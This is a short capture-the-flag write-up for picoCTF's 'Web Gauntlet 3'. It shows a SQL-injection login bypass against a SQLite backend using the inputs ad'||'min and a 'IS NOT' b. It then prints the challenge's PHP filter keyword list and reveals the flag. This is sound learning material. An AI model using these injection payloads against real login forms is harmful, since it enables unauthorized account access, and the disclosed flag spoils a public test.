# Web Gauntlet 3
## Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:

```
If the flag is not displayed after completing this challenge, 
try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.
```

Last time, I promise! Only 25 characters this time. 
Log in as admin Site: http://mercury.picoctf.net:24143/ Filter: http://mercury.picoctf.net:24143/filter.php

## HINTS:
1. Each filter is separated by a space. Spaces are not filtered.
2. There is only 1 round this time, when you beat it the flag will be in filter.php.
3. sqlite

## STEPS:
1. First open the website given and the `filter` website.

![image](https://user-images.githubusercontent.com/70703371/179445184-e1a24a42-6c95-4f1f-a113-58a1beeee0c3.png)

2. Seems the website doesn't filter the `'` and `||` symbol.
3. Try to enter the username as `ad'||'min` and the password as `ad'||'min`.

> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/179445256-13e9df6a-76e8-48e1-a5eb-059ed1363833.png)

4. Let's enter the password as `a 'IS NOT' b` and the username as `ad'||'min`

![image](https://user-images.githubusercontent.com/70703371/179445391-e1a0ea4b-1853-45bd-9abd-4ac445a600fc.png)

5. Yes, we got it! Now open the `filter.php` file.

![image](https://user-images.githubusercontent.com/70703371/179445439-af53a8fd-87fd-4706-9273-c54182c68776.png)


```php
 <?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_fc8788aa1604881093434ba00ba5b9cd}
?>

```

6. Finally, we got the flag!

---
## FLAG

```
picoCTF{k3ep_1t_sh0rt_fc8788aa1604881093434ba00ba5b9cd}
```
